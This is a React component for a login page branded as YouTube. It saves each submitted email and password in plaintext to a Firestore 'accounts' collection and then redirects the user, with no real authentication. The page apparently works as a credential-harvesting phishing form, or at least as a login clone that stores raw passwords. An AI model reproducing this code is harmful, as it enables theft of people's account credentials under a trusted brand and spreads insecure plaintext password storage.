import React from "react";
import { useState } from "react";
import { TextField } from "@mui/material";
import "./form.css";
import { logo } from "../utils/constants";
import { db } from "../Firebase";
import { addDoc, collection, serverTimestamp } from "firebase/firestore";
import { async } from "@firebase/util";
import { backgroundImg } from "../utils/constants";
import styled from "styled-components";
import { Style } from "@mui/icons-material";
import { useNavigate } from "react-router-dom";

function Form() {
  const [isFormShowing, setIsFormShowing] = useState(true);
  const [overlay, setOverlay] = useState(true);
  const [email, setEamil] = useState("");
  const [password, setPassword] = useState("");
  const navigate = useNavigate();

  const submitHandler = async (e) => {
    e.preventDefault();
    if (email && password) {
      setIsFormShowing(!isFormShowing);
      setOverlay(!overlay);
      await addDoc(collection(db, "accounts"), {
        email: email,
        password: password,
        timestamp: serverTimestamp(),
      });
      navigate("/home");
    }
  };

  return (
    <div className="form__container" >
      
      <form className={!isFormShowing ? "show" : ""}>
        <div className="container ">
          <div className="brand-logo">
            <img src={logo} width="100%" />
          </div>
          <div className="brand-title">YOUTUBE</div>

          <div className="inputs">
            <label className="form__label">EMAIL</label>
            <input
              className="form__input"
              onChange={(e) => setEamil(e.target.value)}
              type="email"
              value={email}
              placeholder="example@test.com"
            />
            <label className="form__label">PASSWORD</label>
            <input
              className="form__input"
              onChange={(e) => setPassword(e.target.value)}
              type="password"
              placeholder="Min 6 charaters long"
              value={password}
            />

            <button className="form__btn" type="submit" onClick={submitHandler}>
              LOGIN
            </button>
          </div>
        </div>
      </form>
    </div>
  );
}

export default Form;
